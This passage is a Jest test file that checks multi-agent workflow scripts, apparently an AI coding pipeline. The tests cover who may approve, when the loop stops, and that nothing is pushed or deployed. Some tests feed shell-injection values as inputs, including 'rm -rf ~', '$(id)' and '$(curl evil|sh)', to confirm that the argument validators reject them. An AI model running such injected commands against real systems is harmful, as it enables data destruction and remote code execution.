import { describe, it, expect } from "@jest/globals";
import * as fs from "fs";
import * as path from "path";
import * as vm from "vm";

/**
 * workflows/*.js (docs/DRIVERS-WORKFLOW.md): the scripts of the multi-agent workflows. They are plain JavaScript run by the Workflow tool, which supplies
 * agent(), parallel(), phase() and log(). Here they are checked as files, and their orchestration (who may approve, when the loop stops, what a missing
 * answer means) is run with stand-ins for the agents, so the rules are tested without a model: a rule nobody can see fail is a wish.
 */
const dir = path.join(__dirname, "..", "workflows");
const files = fs.readdirSync(dir).filter((f) => f.endsWith(".js")).sort();
const AsyncFunction = Object.getPrototypeOf(async function () { /* only for its constructor */ }).constructor;

interface Script { name: string; text: string; meta: any; body: string }
function load(file: string): Script {
  const text = fs.readFileSync(path.join(dir, file), "utf8");
  const m = /^export const meta = (\{[\s\S]*?\n\})\n/m.exec(text);
  if (!m) throw new Error(`${file}: no "export const meta = {...}" at the top`);
  const meta = vm.runInNewContext(`(${m[1]})`, Object.freeze({})); // a pure literal: it must evaluate with nothing in scope
  return { name: file.replace(/\.js$/, ""), text, meta, body: text.replace(m[0], "") };
}
const scripts = files.map(load);

describe("the workflow scripts as files", () => {
  it("are there: drive-gate and engineer-loop", () => {
    expect(files).toEqual(["drive-gate.js", "engineer-loop.js"]);
  });

  for (const s of scripts) {
    describe(s.name, () => {
      it("has a meta that is a pure literal with the name of the file, a one-line description and phases with unique titles", () => {
        expect(s.meta.name).toBe(s.name);
        expect(typeof s.meta.description).toBe("string");
        expect(s.meta.description.length).toBeGreaterThan(20);
        expect(s.meta.description).not.toContain("\n");
        const titles = s.meta.phases.map((p: any) => p.title);
        expect(new Set(titles).size).toBe(titles.length);
        expect(titles.length).toBeGreaterThanOrEqual(3);
      });

      it("compiles as the body of an async function (plain JavaScript, no TypeScript)", () => {
        expect(() => new AsyncFunction("args", "agent", "parallel", "pipeline", "phase", "log", "budget", "workflow", s.body)).not.toThrow();
        expect(s.body).not.toMatch(/:\s*(string|number|boolean|any)\b\s*[=,)]/); // a type annotation
      });

      it("calls phase() only with the titles its meta lists, and uses every title", () => {
        const titles = new Set(s.meta.phases.map((p: any) => p.title));
        const used = new Set<string>();
        for (const m of s.body.matchAll(/\bphase\((?:'([^']+)'|"([^"]+)")\)/g)) used.add(m[1] ?? m[2]);
        for (const m of s.body.matchAll(/phase: '([^']+)'/g)) used.add(m[1]);
        for (const t of used) expect({ title: t, listed: titles.has(t) }).toEqual({ title: t, listed: true });
        for (const t of titles) expect({ title: t, used: used.has(t as string) }).toEqual({ title: t, used: true });
      });

      it("uses nothing that would break a resume: no clock, no randomness", () => {
        expect(s.body).not.toMatch(/Date\.now|Math\.random|new Date\(\s*\)/);
      });

      it("never pushes, merges or deploys: a sentence that names such a command also forbids it, with the forbidding word before it", () => {
        const command = /git\s+(push|reset\s+--hard)|gh\s+pr\s+(create|merge)|npm\s+publish|kubectl\s+apply|railway\s+up|docker\s+push|--force/;
        const forbidden = /\b(never|do not|must not|not allowed|without|forbid\w*)\b[^\n]*(git\s+(push|reset\s+--hard)|gh\s+pr\s+(create|merge)|npm\s+publish|kubectl\s+apply|railway\s+up|docker\s+push|--force)/i;
        const bad = s.text.split(/[.;\n]/).filter((l) => command.test(l) && !forbidden.test(l)); // by sentence: a "never" earlier in the same line does not excuse a later command
        expect(bad).toEqual([]);
      });
    });
  }
});

// ---------------------------------------------------------------- running the orchestration with stand-ins for the agents

type Handler = (label: string, prompt: string, opts: any) => any;
async function run(script: string, args: any, handler: Handler) {
  const s = scripts.find((x) => x.name === script)!;
  const calls: Array<{ label: string; prompt: string; opts: any }> = [];
  const agent = async (prompt: string, opts: any = {}) => { calls.push({ label: opts.label, prompt, opts }); const out = await handler(opts.label, prompt, opts); return out === undefined ? null : out; };
  const parallel = async (thunks: Array<() => Promise<any>>) => Promise.all(thunks.map((t) => t().catch(() => null)));
  const logs: string[] = [];
  const fn = new AsyncFunction("args", "agent", "parallel", "pipeline", "phase", "log", "budget", "workflow", s.body);
  const result = await fn(args, agent, parallel, undefined, () => undefined, (m: string) => logs.push(m), { total: null, spent: () => 0, remaining: () => Infinity }, undefined);
  return { result, calls, logs };
}

describe("drive-gate: who decides", () => {
  const runOk = (label: string, exit = 0) => ({ label, exit_code: exit, report_path: `/e/${label}.json`, table_path: `/e/${label}.txt`, sha256: "a".repeat(64), node_version: "v22", git_head: "abc", tracked_files_modified: false });
  const critic = (role: string, verdict = "PASS", findings: any[] = []) => ({ role, verdict, checked: ["x"], findings });
  // the Validation stand-in also says what it read in each report file: the label, the verdict inside it and the SHA-256 it computed
  const reportsOf = (labels: string[], verdict = "PASS", sha = "a".repeat(64)) => labels.map((label) => ({ label, report_verdict: verdict, sha256: sha }));
  // the handler has the shape of agent(): label, prompt, options; this one does not need the prompt or the options
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  const gate = (over: Partial<Record<string, any>> = {}, labels: string[] = ["default"]) => (label: string, _prompt?: string, _opts?: any): any => {
    if (label.startsWith("run:")) return "run" in over ? over.run(label.slice(4)) : runOk(label.slice(4));
    if (label === "critic:validation") return "validation" in over ? over.validation : { ...critic("validation"), reports: reportsOf(labels) };
    if (label === "critic:security") return "security" in over ? over.security : critic("security");
    if (label === "critic:adversarial") return "adversarial" in over ? over.adversarial : critic("adversarial");
  };

  it("PASS only when every run exits 0 and no critic finds anything that matters", async () => {
    const { result } = await run("drive-gate", {}, gate());
    expect(result.verdict).toBe("PASS");
    expect(result.deploy).toMatch(/not performed/);
    expect(result.critics.map((c: any) => c.role)).toEqual(["validation", "security", "adversarial"]);
    expect(result.not_covered.join(" ")).toMatch(/Windows/);
  });

  it("FAIL when a run exits non-zero, whatever the critics say", async () => {
    const { result } = await run("drive-gate", {}, gate({ run: (l: string) => runOk(l, 1) }));
    expect(result.verdict).toBe("FAIL");
    expect(result.reasons[0]).toMatch(/did not end with exit code 0/);
  });

  it("FAIL when the Testing agent's run changed tracked files", async () => {
    const { result } = await run("drive-gate", {}, gate({ run: (l: string) => ({ ...runOk(l), tracked_files_modified: true }) }));
    expect(result.verdict).toBe("FAIL");
    expect(result.reasons.join(" ")).toMatch(/modified tracked files/);
  });

  it("FAIL when a critic says FAIL or reports a blocker, even with a PASS verdict next to it", async () => {
    expect((await run("drive-gate", {}, gate({ security: critic("security", "FAIL", [{ severity: "major", title: "t", evidence: "e", next_action: "n" }]) }))).result.verdict).toBe("FAIL");
    expect((await run("drive-gate", {}, gate({ adversarial: critic("adversarial", "PASS", [{ severity: "blocker", title: "gate stayed green", evidence: "e", next_action: "n" }]) }))).result.verdict).toBe("FAIL");
  });

  it("REVIEW_REQUIRED when a critic asks for a human, or reports a major finding, or gave no answer: never a quiet PASS", async () => {
    expect((await run("drive-gate", {}, gate({ validation: critic("validation", "REVIEW_REQUIRED") }))).result.verdict).toBe("REVIEW_REQUIRED");
    expect((await run("drive-gate", {}, gate({ validation: critic("validation", "PASS", [{ severity: "major", title: "t", evidence: "e", next_action: "n" }]) }))).result.verdict).toBe("REVIEW_REQUIRED");
    const silent = await run("drive-gate", {}, gate({ security: null }));
    expect(silent.result.verdict).toBe("REVIEW_REQUIRED");
    expect(silent.result.critics.find((c: any) => c.verdict === "NO ANSWER")).toBeTruthy();
  });

  it("FAIL when a Testing agent gave no answer at all (nothing was run that anybody saw), and it is not listed as evidence", async () => {
    const { result } = await run("drive-gate", {}, gate({ run: () => null }));
    expect(result.verdict).toBe("FAIL");
    expect(result.evidence).toEqual([]);
    const half = await run("drive-gate", { runs: [{ label: "a", path_prefix: "" }, { label: "b", path_prefix: "" }] }, gate({ run: (l: string) => (l === "a" ? runOk("a") : null) }, ["a"]));
    expect(half.result.verdict).toBe("FAIL");
    expect(half.result.evidence.map((e: any) => e.label)).toEqual(["a"]); // a runner that said nothing is not evidence
    expect(half.result.reasons.join(" ")).toContain("b (agent failed)");
  });

  it("an answer of an odd shape or spelling is never a pass: a critic that says Fail, or has no verdict, or answers with a text, or calls a finding critical", async () => {
    const f = (severity: string) => ({ severity, title: "t", evidence: "e", next_action: "n" });
    const verdictOf = async (security: any) => (await run("drive-gate", {}, gate({ security }))).result.verdict;
    for (const verdict of ["Fail", "FAILED", "fail"]) expect({ verdict, got: await verdictOf({ ...critic("security"), verdict }) }).toEqual({ verdict, got: "FAIL" });
    expect(await verdictOf(critic("security", "PASS", [f("Blocker")]))).toBe("FAIL");
    for (const verdict of ["REVIEW REQUIRED", "review_required", undefined, "PASSED", "ok", ""]) expect({ verdict, got: await verdictOf({ ...critic("security"), verdict }) }).toEqual({ verdict, got: "REVIEW_REQUIRED" });
    expect(await verdictOf(critic("security", "PASS", [f("critical")]))).toBe("REVIEW_REQUIRED");
    expect(await verdictOf(critic("security", "PASS", [f("Minor")]))).toBe("PASS");
    for (const answer of [{}, "FAIL", "all fine", 5, { verdict: "PASS" }, { verdict: "PASS", findings: "none" }, { verdict: "PASS", findings: null }]) expect({ answer, got: await verdictOf(answer) }).toEqual({ answer, got: "REVIEW_REQUIRED" });
  });

  it("an answer of the Testing runner that is not whole is a failure: no exit code as a number, no report, the wrong label, no word about the tracked files", async () => {
    const whole = runOk("default");
    const verdictOf = async (answer: any) => (await run("drive-gate", {}, gate({ run: () => answer }))).result.verdict;
    expect(await verdictOf(whole)).toBe("PASS");
    for (const answer of [{ ...whole, exit_code: "0" }, { ...whole, exit_code: undefined }, { ...whole, report_path: "" }, { ...whole, report_path: undefined }, { ...whole, sha256: "" }, { ...whole, sha256: undefined }, { ...whole, label: "other" }, "exit 0", 0]) {
      expect({ answer, got: await verdictOf(answer) }).toEqual({ answer, got: "FAIL" });
      // and it is said to be unusable, and it is not listed as evidence (the verdict alone could come from another rule)
      const { result } = await run("drive-gate", {}, gate({ run: () => answer }));
      expect({ answer, evidence: result.evidence }).toEqual({ answer, evidence: [] });
      expect({ answer, reasons: result.reasons.join(" ") }).toEqual({ answer, reasons: expect.stringMatching(/answer unusable|agent failed/) });
    }
    // a whole answer that does not say the tracked files are unchanged is evidence of a run, and a failure for its own reason
    for (const answer of [{ ...whole, tracked_files_modified: undefined }, { ...whole, tracked_files_modified: "false" }, { ...whole, tracked_files_modified: true }]) {
      const { result } = await run("drive-gate", {}, gate({ run: () => answer }));
      expect({ answer, got: result.verdict }).toEqual({ answer, got: "FAIL" });
      expect(result.reasons.join(" ")).toMatch(/modified tracked files/);
    }
  });

  it("compares what the runner said with what the Validation critic read in the report itself: the SHA-256, and a verdict that agrees with the exit code", async () => {
    const verdictOf = async (validation: any) => (await run("drive-gate", {}, gate({ validation }))).result;
    const v = (reports: any) => ({ ...critic("validation"), reports });
    expect((await verdictOf(v(reportsOf(["default"])))).verdict).toBe("PASS");
    const wrongSha = await verdictOf(v(reportsOf(["default"], "PASS", "b".repeat(64))));
    expect(wrongSha.verdict).toBe("FAIL");
    expect(wrongSha.reasons.join(" ")).toMatch(/not the one the runner described/);
    const wrongVerdict = await verdictOf(v(reportsOf(["default"], "FAIL")));
    expect(wrongVerdict.verdict).toBe("FAIL");
    expect(wrongVerdict.reasons.join(" ")).toMatch(/does not match the verdict in the report/);
    for (const reports of [undefined, [], reportsOf(["another"]), "none"]) {
      const out = await verdictOf(v(reports));
      expect({ reports, verdict: out.verdict }).toEqual({ reports, verdict: "REVIEW_REQUIRED" });
      expect(out.reasons.join(" ")).toMatch(/did not report what the report file says/);
    }
    expect((await verdictOf(v(reportsOf(["default"], "pass", "A".repeat(64))))).verdict).toBe("PASS"); // the case of a hash or of a word is not what is compared
  });

  it("takes the role of a finding from the critic that gave it, not from the finding", async () => {
    const { result } = await run("drive-gate", {}, gate({ security: critic("security", "REVIEW_REQUIRED", [{ severity: "major", title: "t", evidence: "e", next_action: "n", role: "validation" }]) }));
    expect(result.findings[0].role).toBe("security");
    expect(result.critics.map((c: any) => c.role)).toEqual(["validation", "security", "adversarial"]);
  });

  it("takes only paths, labels and prefixes that cannot break out of the shell commands the agents are given", async () => {
    for (const repo of ["relative", "/r; rm -rf ~", "/r && echo hi", "/a b", "/r$(id)", "/r`id`", 5]) await expect(run("drive-gate", { repo }, gate())).rejects.toThrow(/args\.repo/);
    for (const evidence_dir of ["relative", "/e && echo hi", "/e;x", "/e x"]) await expect(run("drive-gate", { evidence_dir }, gate())).rejects.toThrow(/args\.evidence_dir/);
    const bad = [[], "node22", [{ label: "" }], [{ label: 'x"; touch /tmp/PWNED #$(id)' }], [{ label: "a b" }], [{ label: "a" }, { label: "a" }], [{ label: "-a" }], [{ label: "a", path_prefix: "/opt/n/bin:$(curl evil|sh)" }], [{ label: "a", path_prefix: "/o p" }], Array.from({ length: 5 }, (_, i) => ({ label: "r" + i })), [null], [{}]];
    for (const runs of bad) await expect(run("drive-gate", { runs }, gate())).rejects.toThrow(/args\.runs/);
    const ok = await run("drive-gate", { repo: "/home/user/repo-1.2_x", evidence_dir: "/tmp/ev_1", runs: [{ label: "node22", path_prefix: "/opt/node22/bin" }, { label: "node-24" }] }, gate({}, ["node22", "node-24"]));
    expect(ok.result.verdict).toBe("PASS");
  });

  it("bounds the breakages also for odd values: a text, a fraction, NaN", async () => {
    const asked = async (n: any) => (await run("drive-gate", { breakages: n }, gate())).calls.find((c) => c.label === "critic:adversarial")!.prompt;
    for (const n of ["abc", 2.5, NaN, null, "4", {}]) expect({ n, prompt: (await asked(n)).includes("Make 3 different") }).toEqual({ n, prompt: true });
    expect(await asked(4)).toContain("Make 4 different");
  });

  it("has the runner note the state of the tracked files before it does anything and compare afterwards, and clear the files of an earlier run first", async () => {
    const prompt = (await run("drive-gate", { evidence_dir: "/ev" }, gate())).calls.find((c) => c.label.startsWith("run:"))!.prompt;
    expect(prompt).toMatch(/baseline/);
    expect(prompt).toMatch(/differs from the baseline/);
    expect(prompt).toContain("rm -f /ev/default.json /ev/default.stderr");
  });

  it("asks the Validation critic for the label, verdict and SHA-256 of each report, and tells the Security critic to wait for the other critics' drivers", async () => {
    const { calls } = await run("drive-gate", {}, gate());
    expect(calls.find((c) => c.label === "critic:validation")!.prompt).toMatch(/In `reports` give, for every report file named above/);
    expect(calls.find((c) => c.label === "critic:validation")!.prompt).toMatch(/the `verdict` field you read in that JSON yourself, and the SHA-256 you computed yourself; the script compares them with what the runner said/);
    expect(calls.find((c) => c.label === "critic:security")!.prompt).toMatch(/wait until `pgrep -f drive-` prints nothing for 5 seconds/);
  });

  it("turns a major or blocker finding into a next action for a human, and leaves minor ones out", async () => {
    const f = (severity: string, next_action: string) => ({ severity, title: severity, evidence: "e", next_action });
    const { result } = await run("drive-gate", {}, gate({ validation: critic("validation", "REVIEW_REQUIRED", [f("minor", "tidy a comment"), f("major", "read the gap in the report")]) }));
    expect(result.next_actions).toEqual(["validation: read the gap in the report"]);
    expect(result.findings).toHaveLength(2); // all of them are still reported
  });

  it("runs one Testing agent per run entry, one after the other (each builds the checkout), and gives every critic the evidence of all of them", async () => {
    const runs = [{ label: "node22", path_prefix: "/n22" }, { label: "node24", path_prefix: "/n24" }];
    const { calls, result } = await run("drive-gate", { runs, repo: "/r", evidence_dir: "/ev" }, gate());
    expect(calls.filter((c) => c.label.startsWith("run:")).map((c) => c.label)).toEqual(["run:node22", "run:node24"]); // in the order given
    const order: string[] = [];
    const h = gate({}, ["node22", "node24"]);
    await run("drive-gate", { runs }, (label, p, o) => { order.push(label); return h(label, p, o); });
    expect(order.indexOf("run:node22")).toBeLessThan(order.indexOf("run:node24"));
    expect(order.indexOf("run:node24")).toBeLessThan(order.indexOf("critic:validation")); // and the critics wait for both
    const critics = calls.filter((c) => c.label.startsWith("critic:"));
    expect(critics).toHaveLength(3);
    for (const c of critics) { expect(c.prompt).toContain("/e/node22.json"); expect(c.prompt).toContain("/e/node24.json"); }
    expect(result.evidence).toHaveLength(2);
    expect(calls.find((c) => c.label === "run:node22")!.prompt).toContain("/n22");
  });

  it("keeps the runner and the critics apart: a critic is told not to trust a summary and is not given the runner's reading", async () => {
    const { calls } = await run("drive-gate", {}, gate());
    for (const c of calls.filter((x) => x.label.startsWith("critic:"))) {
      expect(c.prompt).toMatch(/did NOT produce this evidence/);
      expect(c.prompt).toMatch(/must not trust anyone's summary of it/);
      expect(c.prompt).not.toMatch(/the runner (says|found|reported)/i);
    }
    expect(calls.find((c) => c.label.startsWith("run:"))!.prompt).toMatch(/do not interpret/i);
  });

  it("tells every agent the rules: no commits, no pushes, nothing deployed, no secret values", async () => {
    const { calls } = await run("drive-gate", {}, gate());
    for (const c of calls) {
      expect(c.prompt).toMatch(/never modify tracked files/);
      expect(c.prompt).toMatch(/never run git commit, push, checkout, reset or stash/);
      expect(c.prompt).toMatch(/never print or invent a secret value/);
      expect(c.prompt).toMatch(/human's explicit approval/);
    }
  });

  it("bounds the number of breakages the adversarial tester is asked for", async () => {
    const asked = async (n: any) => (await run("drive-gate", { breakages: n }, gate())).calls.find((c) => c.label === "critic:adversarial")!.prompt;
    expect(await asked(undefined)).toContain("Make 3 different");
    expect(await asked(100)).toContain("Make 6 different");
    expect(await asked(0)).toContain("Make 3 different"); // 0 is "not given"
    expect(await asked(-4)).toContain("Make 1 different");
  });

  it("has the runner build and package this commit, in that order (the build removes the package), run drive-all once, and keep no second table", async () => {
    const { calls } = await run("drive-gate", { repo: "/r", evidence_dir: "/ev" }, gate());
    const prompt = calls.find((c) => c.label.startsWith("run:"))!.prompt;
    expect(prompt.indexOf("npm run build")).toBeGreaterThan(-1);
    expect(prompt.indexOf("npm run build")).toBeLessThan(prompt.indexOf("npm run mcpb"));
    expect(prompt.match(/node scripts\/drive-all\.js/g)).toHaveLength(1);
    expect(prompt).not.toMatch(/\.txt/);
    for (const c of calls.filter((x) => x.label.startsWith("critic:"))) expect(c.prompt).not.toMatch(/table:/);
  });

  it("keeps the node_modules link of a worktree out of git: the ignore rule has no trailing slash, which would not match a link", () => {
    const lines = fs.readFileSync(path.join(__dirname, "..", ".gitignore"), "utf8").split("\n").map((l) => l.trim());
    expect(lines).toContain("node_modules");
    expect(lines).not.toContain("node_modules/");
  });

  it("tells every agent to say NOT VERIFIED instead of 'works' and never to invent numbers, and the Security critic to look only at work directories newer than the evidence", async () => {
    const { calls } = await run("drive-gate", {}, gate());
    for (const c of calls) { expect(c.prompt).toMatch(/NOT VERIFIED \/ NOT AVAILABLE \/ BLOCKED/); expect(c.prompt).toMatch(/never invent numbers/); }
    expect(calls.find((c) => c.label === "critic:security")!.prompt).toMatch(/newer than the evidence files/);
  });

  it("says in the adversarial tester's prompt what a FAIL means and which place is known not to be covered", async () => {
    const prompt = (await run("drive-gate", {}, gate())).calls.find((c) => c.label === "critic:adversarial")!.prompt;
    expect(prompt).toContain("the gate has a hole at that place");
    expect(prompt).toContain("protocolVersion");
  });

  it("tells the adversarial tester that a breakage the gate does not notice is a blocker, and to break a copy, never the repository", async () => {
    const { calls } = await run("drive-gate", { repo: "/r" }, gate());
    const prompt = calls.find((c) => c.label === "critic:adversarial")!.prompt;
    expect(prompt).toContain("A breakage that leaves the gate green is a blocker finding");
    expect(prompt).toContain("Edit the copy of dist/ only");
    expect(prompt).toContain("Never touch /r");
  });
});

describe("engineer-loop: who may approve, when it stops", () => {
  const plan = { base_sha: "b".repeat(40), criteria: [{ id: "C1", statement: "s", how_to_check: "h" }, { id: "C2", statement: "s2", how_to_check: "h2" }], files_likely: ["a.js"], risks: [], out_of_scope: [] };
  const built = (n: number) => ({ commit: `c${n}`.padEnd(40, "0"), worktree: `/w/round-${n}`, summary: `round ${n}`, files: ["a.js"], deviations: [], not_done: [] });
  const tests = (passed: boolean, failures: string[] = []) => ({ passed, commands: [{ command: "npm test", exit_code: passed ? 0 : 1, summary: "s" }], failures, not_available: [] });
  const sec = (findings: any[] = []) => ({ role: "security", summary: "s", findings });
  const val = (met: string[] = ["yes", "yes"], findings: any[] = []) => ({ summary: "s", criteria: met.map((m, i) => ({ id: `C${i + 1}`, met: m, evidence: "e" })), findings });
  const finding = (key: string, severity = "major") => ({ key, severity, title: key, evidence: "e", fix: "f" });
  /** round -> what the three critics answer */
  // the handler has the shape of agent(): label, prompt, options; these two do not need the prompt or the options
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  const loop = (rounds: Record<number, { test?: any; sec?: any; val?: any }>) => (label: string, _prompt?: string, _opts?: any): any => {
    if (label === "research") return { facts: [{ claim: "c", source: "s", verified: true }], unknowns: [] };
    if (label === "planning") return plan;
    const [role, n] = label.split(":");
    const r = rounds[Number(n)] || {};
    if (role === "engineer") return built(Number(n));
    // the Testing agent names the commit it judged and where the local branch is: here, the commit of that round, unless a test says otherwise
    if (role === "test") { const t = "test" in r ? r.test : tests(true); return t && typeof t === "object" ? { commit: built(Number(n)).commit, branch_commit: built(Number(n)).commit, ...t } : t; }
    if (role === "security") return "sec" in r ? r.sec : sec();
    if (role === "validate") return "val" in r ? r.val : val();
  };
  const start = (over: object = {}) => ({ task: "do the thing", run_id: "t-001", ...over });

  it("refuses to start without a task or with a run id that is not a safe name", async () => {
    await expect(run("engineer-loop", {}, loop({}))).rejects.toThrow(/args\.task is required/);
    await expect(run("engineer-loop", { task: "x" }, loop({}))).rejects.toThrow(/args\.run_id is required/);
    for (const bad of ["a b", "../x", "x/y", "ab", "x".repeat(41), "a;b"]) await expect(run("engineer-loop", { task: "x", run_id: bad }, loop({}))).rejects.toThrow(/args\.run_id/);
  });

  it("an empty or blank task is refused", async () => {
    for (const task of ["", "   ", "\n\t", 5, null]) await expect(run("engineer-loop", { task, run_id: "t-001" }, loop({}))).rejects.toThrow(/args\.task is required/);
  });

  it("checks, by default, in an order that can pass in a fresh checkout: the build removes the package, so the package comes after it and before the drivers", async () => {
    const prompt = (await run("engineer-loop", start(), loop({}))).calls.find((c) => c.label === "test:1")!.prompt;
    const at = (command: string) => prompt.indexOf(JSON.stringify(command));
    expect(at("npm run build")).toBeGreaterThan(-1);
    expect(at("npm run build")).toBeLessThan(at("npm run mcpb"));
    expect(at("npm run mcpb")).toBeLessThan(at("node scripts/drive-all.js"));
    expect(prompt).toMatch(/after `npm run mcpb` if dist\/mcpb is missing/);
  });

  it("tells the Engineering agent not to commit the node_modules link, and the Validation agent that a diff which adds it is a blocker", async () => {
    const { calls } = await run("engineer-loop", start(), loop({}));
    expect(calls.find((c) => c.label === "engineer:1")!.prompt).toMatch(/never `git add -A`/);
    expect(calls.find((c) => c.label === "engineer:1")!.prompt).toMatch(/lists no node_modules and no dist/);
    expect(calls.find((c) => c.label === "validate:1")!.prompt).toMatch(/add node_modules, dist or a link to them \(a blocker\)/);
  });

  it("approves in the first round when the tests pass, no critic has a blocking finding and every criterion is met", async () => {
    const { result, calls } = await run("engineer-loop", start(), loop({}));
    expect(result.status).toBe("APPROVED_FOR_HUMAN_REVIEW");
    expect(result.approved).toBe(true);
    expect(result.rounds_run).toBe(1);
    expect(calls.map((c) => c.label)).toEqual(["research", "planning", "engineer:1", "test:1", "security:1", "validate:1"]);
    expect(result.production).toMatch(/explicit human approval/);
    expect(result.how_to_take_it).toContain("nothing was pushed, merged or deployed");
    expect(result.local_branch).toBe("wf/engineer-loop/t-001");
  });

  it("a criterion that is not met, or not known to be, blocks approval on its own, and so does a major finding of the Validation agent", async () => {
    const one = async (r: object) => (await run("engineer-loop", start({ max_iterations: 1 }), loop({ 1: r }))).result;
    for (const met of ["no", "unknown"]) {
      const out = await one({ val: val(["yes", met]) });
      expect({ met, approved: out.approved, unmet: out.status }).toEqual({ met, approved: false, unmet: "NOT_APPROVED_MAX_ROUNDS" });
    }
    for (const severity of ["major", "blocker"]) expect((await one({ val: val(["yes", "yes"], [finding("v", severity)]) })).approved).toBe(false);
    expect((await one({ val: val(["yes", "yes"], [finding("v", "minor")]) })).approved).toBe(true);
    // and the finding goes back to the Engineering agent of the next round
    const { calls } = await run("engineer-loop", start({ max_iterations: 2 }), loop({ 1: { val: val(["yes", "yes"], [finding("from-validation")]) } }));
    expect(calls.find((c) => c.label === "engineer:2")!.prompt).toContain("from-validation");
  });

  it("only a criterion of the plan that the Validation agent judged 'yes', once, counts as met: none judged, one left out, 'Yes', or two answers that differ do not", async () => {
    const one = async (criteria: any[]) => (await run("engineer-loop", start({ max_iterations: 1 }), loop({ 1: { val: { summary: "s", criteria, findings: [] } } }))).result;
    const yes = (id: string) => ({ id, met: "yes", evidence: "e" });
    expect((await one([yes("C1"), yes("C2")])).approved).toBe(true);
    for (const criteria of [[], [yes("C1")], [yes("C1"), yes("C2"), { id: "C2", met: "no", evidence: "e" }], [yes("C1"), { id: "C2", met: "Yes", evidence: "e" }], [yes("C1"), yes("C3")]]) {
      expect({ criteria, approved: (await one(criteria)).approved }).toEqual({ criteria, approved: false });
    }
    // an extra criterion the plan does not have is ignored, and a criterion that was left out goes back to the Engineering agent as not judged
    expect((await one([yes("C1"), yes("C2"), yes("C9")])).approved).toBe(true);
    const { calls } = await run("engineer-loop", start({ max_iterations: 2 }), loop({ 1: { val: { summary: "s", criteria: [yes("C1")], findings: [] } } }));
    expect(calls.find((c) => c.label === "engineer:2")!.prompt).toContain('"criterion":"C2","met":"not judged"');
  });

  it("is STALLED when the same critic stays silent in two rounds in a row or the tests fail the same way with nothing listed, and not when the findings change", async () => {
    const silent = await run("engineer-loop", start({ max_iterations: 5 }), loop({ 1: { sec: null }, 2: { sec: null }, 3: { sec: null } }));
    expect(silent.result.status).toBe("STALLED_SAME_FINDINGS_TWICE");
    expect(silent.result.rounds_run).toBe(2);
    const failing = await run("engineer-loop", start({ max_iterations: 5 }), loop({ 1: { test: tests(false, []) }, 2: { test: tests(false, []) } }));
    expect(failing.result.status).toBe("STALLED_SAME_FINDINGS_TWICE");
    const changing = await run("engineer-loop", start({ max_iterations: 3 }), loop({ 1: { sec: null }, 2: { val: null }, 3: { sec: null } }));
    expect(changing.result.status).toBe("NOT_APPROVED_MAX_ROUNDS");
    expect(changing.result.rounds_run).toBe(3);
  });

  it("approves only on a Testing answer that is whole: it ran something, every command exited 0, nothing is listed as failed, it judged the commit it was given and the local branch is at that commit", async () => {
    const one = async (test: any) => (await run("engineer-loop", start({ max_iterations: 1 }), loop({ 1: { test } }))).result;
    const good = tests(true);
    expect((await one(good)).approved).toBe(true);
    const c1 = built(1).commit;
    const bad: Record<string, any> = {
      "it ran nothing (every command unavailable, passed:true all the same)": { ...good, commands: [], not_available: ["npm test"] },
      "a command exited 1 while passed is true": { ...good, commands: [{ command: "npm test", exit_code: 1, summary: "s" }] },
      "failures are listed while passed is true": { ...good, failures: ["a test failed"] },
      "it judged another commit": { ...good, commit: "d".repeat(40) },
      "it did not say which commit it judged": { ...good, commit: undefined },
      "the local branch is somewhere else": { ...good, branch_commit: "e".repeat(40) },
      "no word about the branch": { ...good, branch_commit: undefined },
      "passed is the text true": { ...good, passed: "true" },
      "commands is not a list": { ...good, commands: "npm test: ok" },
      "failures is not a list": { ...good, failures: undefined },
    };
    for (const [what, test] of Object.entries(bad)) {
      const out = await one({ commit: c1, branch_commit: c1, ...test, ...(what.startsWith("it did not say") ? { commit: undefined } : {}), ...(what.startsWith("no word") ? { branch_commit: undefined } : {}) });
      expect({ what, approved: out.approved }).toEqual({ what, approved: false });
    }
    expect((await one({ ...good, commit: c1.slice(0, 10), branch_commit: c1.slice(0, 12) })).approved).toBe(true); // a short hash names the same commit
    expect((await one({ ...good, commit: "c1", branch_commit: "c1" })).approved).toBe(false); // too short to name anything
  });

  it("says why the Testing answer was not enough when it goes back to the Engineering agent", async () => {
    const { calls } = await run("engineer-loop", start({ max_iterations: 2 }), loop({ 1: { test: { ...tests(true), commands: [] } } }));
    expect(calls.find((c) => c.label === "engineer:2")!.prompt).toContain("no command was run");
  });

  it("a finding counts against approval unless it says it is minor: an odd spelling, a missing severity, a text instead of an object", async () => {
    const one = async (findings: any) => (await run("engineer-loop", start({ max_iterations: 1 }), loop({ 1: { sec: { role: "security", summary: "s", findings } } }))).result;
    expect((await one([])).approved).toBe(true);
    expect((await one([finding("m", "minor")])).approved).toBe(true);
    expect((await one([finding("m", "Minor")])).approved).toBe(true); // casing is not a reason to block
    for (const findings of [[finding("b", "Blocker")], [finding("c", "critical")], [{ key: "k", title: "no severity" }], ["a text"], [null], [finding("m", "")]]) {
      expect({ findings, approved: (await one(findings)).approved }).toEqual({ findings, approved: false });
    }
  });

  it("a critic whose answer lacks its list of findings (or of criteria) is a missing answer, not a clean one", async () => {
    const one = async (r: object) => (await run("engineer-loop", start({ max_iterations: 1 }), loop({ 1: r }))).result;
    for (const r of [{ sec: {} }, { sec: { role: "security", summary: "s" } }, { sec: { role: "security", summary: "s", findings: "none" } }, { sec: "all fine" }, { val: { summary: "s", criteria: [{ id: "C1", met: "yes" }, { id: "C2", met: "yes" }] } }, { val: { summary: "s", findings: [] } }, { val: {} }]) {
      expect({ r, approved: (await one(r)).approved }).toEqual({ r, approved: false });
    }
  });

  it("stops at once when the Engineering agent hands back something that is not a commit, or the commit it started from", async () => {
    for (const commit of ["abc; echo pwned", "", "not-a-hash", "C1".padEnd(40, "0"), undefined]) {
      const h = loop({});
      const { result, calls } = await run("engineer-loop", start(), (label, p, o) => (label === "engineer:1" ? { ...built(1), commit } : h(label, p, o)));
      expect({ commit, status: result.status }).toEqual({ commit, status: "STOPPED_NO_ENGINEERING_RESULT" });
      expect(calls.some((c) => c.label.startsWith("test:"))).toBe(false); // nobody is asked to run what is not a commit
    }
    const h = loop({});
    const unchanged = await run("engineer-loop", start(), (label, p, o) => (label === "engineer:1" ? { ...built(1), commit: plan.base_sha } : h(label, p, o)));
    expect(unchanged.result.status).toBe("STOPPED_NO_ENGINEERING_RESULT");
    expect(unchanged.result.implementation_log[0].error).toMatch(/changed nothing/);
  });

  it("refuses a plan without a usable base commit or without criteria, or with two criteria of the same id", async () => {
